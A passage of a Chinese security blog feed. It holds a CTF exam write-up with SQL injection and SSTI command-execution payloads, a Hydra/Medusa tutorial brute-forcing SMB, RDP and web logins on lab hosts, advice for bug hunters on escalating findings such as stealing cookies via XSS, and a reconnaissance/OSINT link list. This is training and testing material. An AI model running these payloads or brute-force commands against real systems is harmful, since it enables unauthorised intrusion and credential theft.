      <url>/2020/04/26/siyecaoyouyisai/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于四叶草云演平台攻防启航班考核</p></blockquote><h2 id="阿童木（任意文件下载）"><a href="#阿童木（任意文件下载）" class="headerlink" title="阿童木（任意文件下载）"></a>阿童木（任意文件下载）</h2><p>打开题目是很多张阿童木的图片，点击图片会直接下载。测试存在任意文件下载漏洞，下载passwd文件找到BASE64加密的flag,解密即可拿到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/atm1.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/atm2.jpg" alt=""></p><h2 id="大学生活（SQL注入）"><a href="#大学生活（SQL注入）" class="headerlink" title="大学生活（SQL注入）"></a>大学生活（SQL注入）</h2><p>更改id值，回显发生变化（底部红框部分）过滤空格、and、order、=等</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#x2F;**&#x2F;%26&#x2F;**&#x2F;1</span><br><span class="line">?id&#x3D;1&#x2F;**&#x2F;%26&#x2F;**&#x2F;0</span><br><span class="line">?id&#x3D;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;6</span><br><span class="line">?id&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7</span><br><span class="line">?id&#x3D;-2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;!(table_schema&lt;&gt;&quot;web&quot;)</span><br><span class="line">?id&#x3D;-2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3,4,5,6,7&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;!(table_name&lt;&gt;&quot;flag&quot;)</span><br><span class="line">?id&#x3D;-2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4,5,6,7&#x2F;**&#x2F;from&#x2F;**&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyydxsh.jpg" alt=""></p><h2 id="后台管理系统（SQL注入、信息泄露）"><a href="#后台管理系统（SQL注入、信息泄露）" class="headerlink" title="后台管理系统（SQL注入、信息泄露）"></a>后台管理系统（SQL注入、信息泄露）</h2><p>本题为约束的SQL注入攻击，登录框尝试万能密码绕过没成功，注册账号时admin后面加空格成功注册后登录即可以admin身份成功登录。本次还存在数据库信息泄露，存在test.sql文件，下载后可得到admin密码。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyyht.jpg" alt=""> </p><h2 id="上网认证系统（文件包含）"><a href="#上网认证系统（文件包含）" class="headerlink" title="上网认证系统（文件包含）"></a>上网认证系统（文件包含）</h2><p>存在本地文件包含，可以利用PHP为协议，同时存在盲注（但是没找到flag）</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyyswrz1.jpg" alt=""></p><p>解题方法之一：根据题目源码会uesrname会存入session，phpinfo找到session文件位置，在注册用户名构造payload并包含，session会base64加密，包含时需进行base64解码，所以paylaod前面应该为8的倍数防止payload解码失败。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyyswrz.jpg" alt=""></p><h2 id="Find-the-hacker（日志分析）"><a href="#Find-the-hacker（日志分析）" class="headerlink" title="Find  the hacker（日志分析）"></a>Find  the hacker（日志分析）</h2><p>题目要求找出恶意爆破成功时间。在日志中找到爆破日志，然后这条302跳转的就是成功爆破那条日志。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyyrz.jpg" alt=""></p><h2 id="手绘（png重水印攻击）"><a href="#手绘（png重水印攻击）" class="headerlink" title="手绘（png重水印攻击）"></a>手绘（png重水印攻击）</h2><p>gihub脚本直接解出flag</p><h2 id="打假（RAR伪加密）"><a href="#打假（RAR伪加密）" class="headerlink" title="打假（RAR伪加密）"></a>打假（RAR伪加密）</h2><p>010editor改加密位即可  </p><p><img src="https://cdn.jsdelivr.net/gh/Cluren/imgHosting/sycyyrar.jpg" alt=""></p><h2 id="Blog（ssit注入）"><a href="#Blog（ssit注入）" class="headerlink" title="Blog（ssit注入）"></a>Blog（ssit注入）</h2><p> 查看网页源代码发现一句注释：    &lt;!– 还特地嘱咐我上线的时候要关闭debug模式，老子早就看你不顺眼了，我就不！</p><p>在自定义模板页面可以进行ssit注入。命令执行可以看源码，最后发现flag文件读取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="NES（DES加密）"><a href="#NES（DES加密）" class="headerlink" title="NES（DES加密）"></a>NES（DES加密）</h2><p>给出的是DES的n次加密，密钥八个一组共6个，逆着解密。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyydnes.jpg" alt=""></p><p>以下是官方writeup给出的脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/sycyynes1.jpg" alt=""></p><h2 id="XBOR（异或加密）"><a href="#XBOR（异或加密）" class="headerlink" title="XBOR（异或加密）"></a>XBOR（异或加密）</h2><p>给出一串字符，看起来像是BASE加密，解密后并不是flag，根据题目提示想到异或，直接利用下面连接的脚本就可以得出flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fnR5f2N7KXt5LyooLn59Kyp6fSp+LS96KCwpIX15LHt+Liope2U&#x3D;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/valecalida/article/details/102717762" target="_blank" rel="noopener">https://blog.csdn.net/valecalida/article/details/102717762</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-nmap模块报错解决办法</title>
      <link href="/2020/04/21/py-nmapbaocuo/"/>
      <url>/2020/04/21/py-nmapbaocuo/</url>
      
        <content type="html"><![CDATA[<h2 id="Python-nmap模块报错解决办法"><a href="#Python-nmap模块报错解决办法" class="headerlink" title="Python-nmap模块报错解决办法"></a>Python-nmap模块报错解决办法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  File &quot;nmap.py&quot;, line 10, in &lt;module&gt;</span><br><span class="line">    nm &#x3D; nmap.PortScanner()</span><br><span class="line">AttributeError: &#39;module&#39; object has no attribute &#39;PortScanner&#39;</span><br></pre></td></tr></table></figure><h2 id="排错记录："><a href="#排错记录：" class="headerlink" title="排错记录："></a>排错记录：</h2><ol><li>文件命名错误，导入模块和文件名相同， 解决办法：改文件名</li><li>卸载nmap模块和python-nmap重新安装python-nmap（只保留python-nmap）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pip uninstall nmap</span><br><span class="line">pip uninstall python-nmap</span><br><span class="line"></span><br><span class="line">#重新安装python-nmap</span><br><span class="line"></span><br><span class="line">pip install python-nmap</span><br></pre></td></tr></table></figure><p>问题排除</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排错 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对渗透新人成长的建议（转载）</title>
      <link href="/2020/03/22/xinshoujianyi/"/>
      <url>/2020/03/22/xinshoujianyi/</url>
      
        <content type="html"><![CDATA[<h2 id="对渗透新人成长的建议"><a href="#对渗透新人成长的建议" class="headerlink" title="对渗透新人成长的建议"></a>对渗透新人成长的建议</h2><ol><li>挖洞一定要去实战：</li></ol><p>不能只在漏洞环境复现漏洞，实战和环境是不一样的。</p><p>实战环境的选择：</p><ul><li><p>漏洞盒子：新人建议首先去漏洞和提挖洞，漏洞盒子接收大多互联网漏洞，无论该单位是否在盒子注册过，漏洞审核相对容易通过。</p></li><li><p>补天：分为公益 SRC 和专属 SRC，补天的审核较为严格，且通常只接收在补天注册的厂商的漏洞和大中型厂商漏洞，其他小站漏洞通常审核不通过。在熟悉漏洞盒子挖洞后，建议去补天挖洞，先挖公益 SRC，再挖专属 SRC（给现金奖励）。</p></li><li><p>各大互联网 SRC，能够在补天专属 SRC 挖洞，基本可以去各个互联网 SRC 挖洞了，无论大小厂的 SRC 都可以尝试。</p></li></ul><ol start="2"><li>掌握利用简单、危害高的逻辑漏洞：</li></ol><p>常见的简单高危漏洞，提交漏洞要制造出高伤害：</p><ul><li><p>竞争条件漏洞（并发抽奖、领取、提现等）。</p></li><li><p>水平越权：当一个公司用户量越大，越权造成的用户数据泄露越多，对甲方的危害极大。注意提交漏洞时，可以遍历一下泄露用户数量的上线，有时候一个简单的越权，泄露几百万用户信息，但切不可拖数据（犯罪），遍历统计上限和样本即可。</p></li><li><p>各种刷量的逻辑漏洞：例如电商的抢优惠券，社区的刷点赞、人气，视频的刷播放量等。</p></li><li><p>测试逻辑漏洞时，注意 Response 返回包中的信息，有些 Response 返回包的参数被篡改后，会进入下一步逻辑流程，并使用被篡改的参数在下一步流程提交。</p></li></ul><ol start="3"><li>学习前端跨域漏洞：Jsonp 劫持、CORS、CSP 等</li></ol><p>面试过不少年轻白帽子，不熟悉前端跨域漏洞，在不少互联网公司 Jsonp 劫持是常见的漏洞，建议大家要学会前端漏洞挖掘和基本知识。</p><ol start="4"><li>提交漏洞要做出高危害</li></ol><p>几个栗子：</p><ul><li><p>SSRF：内网应用越多，危害越大。提交漏洞不要只扫描一下内网访问多个系统就提交了，建议拿下一个内网应用的权限，内网应用通常漏洞多，弱口令多，造成高危害后提交。</p></li><li><p>水平越权：上面说过了，遍历出影响的用户量，如造成用户数据泄露或篡改，遍历泄露的用户数据量、可篡改量。</p></li><li><p>XSS：能打到几个账号的 Cookie 并登录最好，或接收到后台的 cookie 登录后台，将漏洞尽可能升级其影响范围。</p></li><li><p>其他漏洞类似，尽可能做出高危害和对业务的影响。</p></li><li><p>要多挖 APP 漏洞，移动互联网时代，很多互联网公司 90% 以上的流量在 APP 端。</p></li></ul><ol start="5"><li>渗透人员要学会代码层如果修复漏洞，尽量细化到用哪个函数（会攻击也会防御）</li></ol><p>例如：指导研发修复要细化到修复漏洞的函数和示例代码，后端用函数，前端过滤为了减少后端服务器的计算压力。</p><ul><li><p>代码层如何修复 xss 漏洞：后端：在 html 输出用哪个函数过滤，在 JavaScript 中输出，用哪个函数过滤等；前端对输入做哪些过滤。</p></li><li><p>代码层如何修复 SQL 注入漏洞：后端 PHP 代码用哪个函数，JAVA 代码怎么做。前端对用户输入做哪些过滤。</p></li><li><p>水平越权的修复：校验用户 Session，不能只校验 uid 等等。</p></li><li><p>其他漏洞修复类似，不要只提一句话修复文字，最好能够细化到代码层的实现，或者逻辑的设计，针对逻辑漏洞，说明逻辑，或者能画出逻辑流程图和文字更好，方便产品经理和开发理解。</p></li></ul><p>转自公众号信安之路： <a href="https://mp.weixin.qq.com/s/1Z_5znAajRzHrDGP60KEtQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1Z_5znAajRzHrDGP60KEtQ</a> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra/Medusa爆破工具实操</title>
      <link href="/2020/03/22/baopo/"/>
      <url>/2020/03/22/baopo/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-hydra参数介绍"><a href="#0x01-hydra参数介绍" class="headerlink" title="0x01 hydra参数介绍"></a>0x01 hydra参数介绍</h2><p>hydra命令参数介绍:<br>    -l         #指定单个用户名称<br>    -L        #指定用户名称字典<br>    -P        #指定单个密码<br>    -p        #指定密码字典<br>    -s         #指定端口<br>    -vV      #显示详细的执行过程<br>    -R        #根据上一次进度继续破解<br>    -S        #使用SSL协议连接<br>    -s        #指定端口<br>    -o        #输出文件<br>    -C        #指定用户密码字典(username:password)<br>    -e        #空密码探测和指定用户密码探测(ns)</p><h2 id="0x02-medusa命令参数介绍"><a href="#0x02-medusa命令参数介绍" class="headerlink" title="0x02 medusa命令参数介绍"></a>0x02 medusa命令参数介绍</h2><p>Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</p><p>Medusa [-h 主机| -H 文件] [-u 用户名| -U 文件] [-p 密码| -P 文件] [-C 文件] -M 模块[OPT]</p><p> -h [TEXT]：目标主机名或IP地址</p><p>-H [FILE]：包含目标主机名或IP地址的文件</p><p>-u [TEXT]：要测试的用户名</p><p>-U [FILE]：包含要测试的用户名的文件</p><p>-p [TEXT]：要测试的密码</p><p>-P [FILE]：包含要测试的密码的文件</p><p>-C [FILE]：包含组合条目的文件（user:password）</p><p>-O [FILE]：将日志信息附加到的文件</p><p>-e [n / s / ns]：其他密码检查（n无密码，s 密码=用户名）</p><p>-M [TEXT]：要执行的模块的名称（不带.mod扩展名）</p><p>-m [TEXT]：传递给模块的参数。这可以通过一个多次传递不同的参数，并且它们全部被发送到模块（-m Param1 -m Param2等）</p><p>-d：转储所有已知的模块</p><p>-n [NUM]：使用非默认端口</p><p>-s：启用SSL</p><p>-g [NUM]：尝试连接NUM秒后放弃（默认3）</p><p>-r [NUM]：在重试尝试之间休眠NUM秒（默认值3）</p><p>-R [NUM]：尝试NUM在放弃之前重试。总尝试次数将是NUM + 1。</p><p>-c [NUM]：在usec中等待以验证套接字的时间（缺省值为500 usec）。</p><p>-t [NUM]：要同时测试的登录总数</p><p>-T [NUM]：要同时测试的主机总数</p><p>-L：每个线程使用一个用户名并行登录。默认是处理整个用户名在继续之前。</p><p>-f：在找到第一个有效的用户名/密码后停止扫描主机。</p><p>-F：在任何主机上找到第一个有效的用户名/密码后停止审核。</p><p>-b：禁止启动横幅</p><p>-q：显示模块的使用信息</p><p>-v [NUM]：详细等级[0 - 6]</p><p>-w [NUM]：错误调试级别[0 - 10]</p><p>-V：显示版本</p><p>-Z [TEXT]：继续上次扫描</p><p>medusa 下载地址<a href="http://www.foofus.net/jmk/tools/" target="_blank" rel="noopener">http://www.foofus.net/jmk/tools/</a> </p><h2 id="0x03-hydra实操演示"><a href="#0x03-hydra实操演示" class="headerlink" title="0x03 hydra实操演示"></a>0x03 hydra实操演示</h2><ol><li><p>靶机ip：192.168.112 开启SMB协议</p><p> hydra -l Goup -P pass.txt smb://192.168.2.112</p></li></ol><p>对Goup用户进行密码爆破，pass.txt是事先准备的密码字典</p><p>等待片刻得到密码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgbaopo-1.png" alt=""></p><p>（本地演示为了节省时间密码设为123）</p><p>拿到用户密码后直接登录：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgbaopo-2.png" alt=""></p><ol start="2"><li>靶机ip：192.168.112 开启RDP协议</li></ol><p><code>hydra -l Goup -P pass.txt rdp://192.168.2.112</code></p><p>爆破结果：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgbaopo-3.png" alt=""></p><p>登陆测试：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgbaappo-4.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgbaopo-5.png" alt=""></p><ol start="3"><li><p>web登录爆破</p><p><code>hydra  -l admin -P pass.txt -vV  -t 10 -ens -f 192.168.1.2.1 http-post-from &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:FLogin failed&quot;</code></p></li></ol><blockquote><p>medusa使用参考： <a href="https://www.fujieace.com/kali-linux/courses/medusa-2.html" target="_blank" rel="noopener">https://www.fujieace.com/kali-linux/courses/medusa-2.html</a> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透信息收集整理（待补充）</title>
      <link href="/2020/03/21/xinxishouji/"/>
      <url>/2020/03/21/xinxishouji/</url>
      
        <content type="html"><![CDATA[<h2 id="常规信息收集"><a href="#常规信息收集" class="headerlink" title="常规信息收集"></a>常规信息收集</h2><h3 id="利用搜索引擎搜集信息"><a href="#利用搜索引擎搜集信息" class="headerlink" title="利用搜索引擎搜集信息"></a>利用搜索引擎搜集信息</h3><ol><li>Google语法</li><li>天眼查 </li><li>备案信息 </li><li>百度百科 </li><li>维基百科 </li><li><a href="https://spyse.com/" target="_blank" rel="noopener">https://spyse.com/</a></li><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li>搜索相关公众号 </li><li>搜索app</li><li>whois查询</li><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a> </li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn</a> </li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io</a> </li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a> </li></ol><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><ol><li><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a></p></li><li><p>sublist3r:<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p></li><li><p>mydomain:<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></p></li><li><p>lijiejie的subdomainsbrute:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p>JSFinder网站js中提取URL,子域名的工具：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p></li><li><p>oneforall：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p></li><li><p>dnsmaper： <a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> </p></li><li><p>layer</p></li><li><p>google</p></li><li><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p></li><li><p>基于谷歌SSL透明证书的子域名查询<a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">https://github.com/We5ter/GSDF</a></p></li><li><p>…</p></li></ol><h3 id="敏感目录-文件"><a href="#敏感目录-文件" class="headerlink" title="敏感目录/文件"></a>敏感目录/文件</h3><ol><li>.git泄露</li><li>.SVN泄露</li><li>.DS_Store文件泄露</li><li>.hg源码泄露</li><li>数据库文件、私钥等敏感文件泄露扫描<a href="https://github.com/MetaChar/pyHAWK" target="_blank" rel="noopener">https://github.com/MetaChar/pyHAWK</a></li><li>…</li></ol><h3 id="网站目录扫描"><a href="#网站目录扫描" class="headerlink" title="网站目录扫描"></a>网站目录扫描</h3><ol><li><p>御剑</p></li><li><p>dirbuster</p></li><li><p>…</p></li></ol><h3 id="旁站C段查询"><a href="#旁站C段查询" class="headerlink" title="旁站C段查询"></a>旁站C段查询</h3><ol><li><p><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a> </p></li><li><p><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a> </p></li><li><p><a href="http://z.zcjun.com/" target="_blank" rel="noopener">http://z.zcjun.com/</a></p></li><li><p>…</p></li></ol><h3 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h3><ol><li><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> </p></li><li><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a> </p></li><li><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a> </p></li><li><p><a href="https://haosec.cn/" target="_blank" rel="noopener">https://haosec.cn/</a></p></li><li><p>whatweb在线<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a> </p></li><li><p>中间件扫描<a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a></p></li></ol><h3 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h3><ol><li>nmap</li><li>WAF指纹识别及自动化bypass工具<a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></li></ol><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ol start="3"><li><p>namp端口扫描</p></li><li><p>scapy端口扫描</p></li><li><p>nc端口扫面</p></li><li><p>shodan搜索</p></li></ol><h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><ol><li><p>通过邮件(看邮箱头源 ip)找真实 ip（可靠）。</p></li><li><p>通过查询域名历史 ip，<a href="http://toolbar.netcraft.com（借鉴）。" target="_blank" rel="noopener">http://toolbar.netcraft.com（借鉴）。</a></p></li><li><p>通过 zmpap 全网爆破查询真实 ip（可靠）。</p></li><li><p>子域名爆破。</p></li><li><p>通过扫描出网站测试文件如 phpinfo，test 等配置文件。</p></li><li><p>扫到备份,有时候查看配置。</p></li><li><p>主站使用 CND，二级域名不一定使用 CDN，二级域名不一定和主站同一个 IP 有可能是同 C 段，可以扫描整个 C 段 WEB 端口。</p></li><li><p>rss 订阅一般也会得到真实 IP 。</p></li><li><p>国外ping  <a href="https://asm.ca.com/" target="_blank" rel="noopener">https://asm.ca.com/</a> </p></li><li><p>常用查历史记录真实 IP: </p></li></ol><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a> </p><p><a href="http://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">http://www.cdnplanet.com/tools/cdnfinder/</a> </p><p><a href="http://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report</a> </p><p><a href="http://viewdns.info/iphistory/?domain=" target="_blank" rel="noopener">http://viewdns.info/iphistory/?domain=</a> </p><p><a href="http://www.hosterstats.com/historicaldns.php" target="_blank" rel="noopener">http://www.hosterstats.com/historicaldns.php</a> </p><p><a href="http://whoisrequest.com/history/" target="_blank" rel="noopener">http://whoisrequest.com/history/</a> </p><p><a href="http://map.norsecorp.com/#/" target="_blank" rel="noopener">http://map.norsecorp.com/#/</a> </p><p><a href="http://crimeflare.com（查" target="_blank" rel="noopener">http://crimeflare.com（查</a> cloudflare 真实 ip 百试不爽）</p><h2 id="开源情报信息收集"><a href="#开源情报信息收集" class="headerlink" title="开源情报信息收集"></a>开源情报信息收集</h2><p><strong>（一）电子邮件泄露查询</strong></p><p>只要输入一个电子邮件地址，它就会告诉您该电子邮件受到哪些泄露。</p><p>网站网址：<a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">https://haveibeenpwned.com/</a></p><p><strong>（二）事实检查网站</strong></p><p>1、Hoaxy</p><p>网站网址：<a href="https://hoaxy.iuni.iu.edu/faq.html/" target="_blank" rel="noopener">https://hoaxy.iuni.iu.edu/faq.html/</a></p><p>2、MediaBugs（媒体错误）</p><p> Hoaxy是一个开源搜索工具，可在线可视化文章的传播。</p><p>网站网址：<a href="http://mediabugs.or/" target="_blank" rel="noopener">http://mediabugs.or/</a></p><p>MediaBugs是指媒体（例如报纸，杂志，广播等）中错误且可以纠正的东西。</p><p>3、PolitiFact</p><p>网站网址：<a href="https://www.politifact.com/" target="_blank" rel="noopener">https://www.politifact.com/</a></p><p>Politifact专注于事实检查新闻。</p><p>4、SciCheck</p><p>网站网址：<a href="https://www.factcheck.org/scicheck/" target="_blank" rel="noopener">https://www.factcheck.org/scicheck/</a></p><p>SciCheck是FactCheck.org的一项功能，致力于评估对公共政策有影响的虚假和误导性科学主张。</p><p>5、Snopes</p><p>网站网址：<a href="https://www.snopes.com/" target="_blank" rel="noopener">https://www.snopes.com/</a></p><p>Snopes.com是最古老，最好和最著名的事实检查网站之一。这个免费的网站研究了一切，包括城市传说，谣言，神话，可疑的照片和视频，文章和公众人物提出的主张。</p><p>6、Verification Junkie</p><p>网站网址：<a href="https://verificationjunkie.com/" target="_blank" rel="noopener">https://verificationjunkie.com/</a></p><p> Verification Junkie是一组工具，旨在帮助验证和事实检查信息以及评估目击者报告的有效性。</p><p><strong>（三）黑客与威胁评估</strong></p><p>Norse</p><p>网站网址：<a href="https://norsecorp.com/" target="_blank" rel="noopener">https://norsecorp.com/</a></p><p>Norse 拥有全球最大的专用威胁情报网络。</p><p><strong>（四）OSINT图像搜索</strong></p><p>Image Identification Project</p><p>网站网址：<a href="https://www.imageidentify.com/" target="_blank" rel="noopener">https://www.imageidentify.com/</a></p><p> Wolfman图像识别项目是一种搜索工具，使用算法来识别图像。</p><p><strong>（五）公共记录（财产）</strong></p><p>1、梅利莎数据属性查看器</p><p>网站网址：<a href="https://www.melissa.com/v2/lookups/propertyviewer/zipcode/" target="_blank" rel="noopener">https://www.melissa.com/v2/lookups/propertyviewer/zipcode/</a></p><p>2、Emporis建筑物搜索</p><p>网站网址：<a href="https://www.emporis.com/buildings" target="_blank" rel="noopener">https://www.emporis.com/buildings</a></p><p>Emporis网站可让您搜索世界各地的建筑物，公司和设计/建筑图像。</p><p><strong>（六）OSINT搜索引擎</strong></p><p>1、Google trends</p><p>网站网址：<a href="https://trends.google.com/trends/?geo=US" target="_blank" rel="noopener">https://trends.google.com/trends/?geo=US</a></p><p>Google Correlate可帮助您确定与现实趋势相关的搜索模式。</p><p>2、millionshort</p><p>网站网址：<a href="https://millionshort.com/" target="_blank" rel="noopener">https://millionshort.com/</a></p><p>millionshort有一种有趣的在线搜索信息的方法。</p><p>3、Shodan</p><p>网站网址：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><p>Shodan是物联网的搜索引擎和网络安全工具。</p><p>4、TalkWalkerAlerts</p><p>网站网址：<a href="https://www.talkwalker.com/alerts" target="_blank" rel="noopener">https://www.talkwalker.com/alerts</a></p><p>TalkWalkerAlerts是Google快讯的绝佳替代品，因为除了监视网络中的某些关键字外，它还监视社交媒体，博客和论坛。</p><p><strong>（八）OSINT工具网站</strong></p><p>1、英特尔技术</p><p>网站网址：<a href="https://inteltechniques.com/" target="_blank" rel="noopener">https://inteltechniques.com/</a></p><p>2、Hunchly</p><p>网站网址：<a href="https://www.hunch.ly/" target="_blank" rel="noopener">https://www.hunch.ly/</a></p><p> Hunchly是针对调查专业人员的在线证据收集工具。</p><p>3、Maltego</p><p>网站网址：<a href="https://www.maltego.com/" target="_blank" rel="noopener">https://www.maltego.com/</a></p><p>执法人员，法医调查人员和安全专业人员都使用它来分析开源信息资源。</p><p><strong>（九）监视摄像头</strong></p><p>opentopia</p><p>网站网址：<a href="http://www.opentopia.com/" target="_blank" rel="noopener">http://www.opentopia.com/</a></p><p>在以合理的方式汇总全球公共实时流网络摄像头和监视摄像机</p><p><strong>（十）运输–车辆，飞机，轮船</strong></p><p>1、Flight Radar 24</p><p>网站网址：<a href="https://www.flightradar24.com/" target="_blank" rel="noopener">https://www.flightradar24.com/</a></p><p>由两名瑞典航空专家创建的OSINT网站可以让您查看全球的实时飞行跟踪信息。</p><p>2、海上交通</p><p>网站网址：<a href="https://www.marinetraffic.com/en/ais/home/centerx:5.4/centery:50.8/zoom:2" target="_blank" rel="noopener">https://www.marinetraffic.com/en/ais/home/centerx:5.4/centery:50.8/zoom:2</a></p><p>该网站提供全球船舶跟踪情报。</p><p>3、全国飞机登记册</p><p>网址：<a href="https://registry.faa.gov/aircraftinquiry/Aircraft_Inquiry.aspx" target="_blank" rel="noopener">https://registry.faa.gov/aircraftinquiry/Aircraft_Inquiry.aspx</a></p><p>搜索在美国联邦航空管理局（FAA）注册的所有飞机的登记册。</p><p>4、VINCheck</p><p>网站网址：<a href="https://www.nicb.org/vincheck" target="_blank" rel="noopener">https://www.nicb.org/vincheck</a></p><p> VINCheck是国家保险犯罪局提供的在线工具。</p><p><strong>（十一）用户名检查</strong></p><p>1、CheckUserNames</p><p>网站网址：<a href="https://checkusernames.com/" target="_blank" rel="noopener">https://checkusernames.com/</a></p><p>CheckUserNames是一个方便的开源情报工具，它将检查500多个社交网络上用户名的可用性。</p><p>2、Namech_k</p><p>网站网址：<a href="https://namechk.com/" target="_blank" 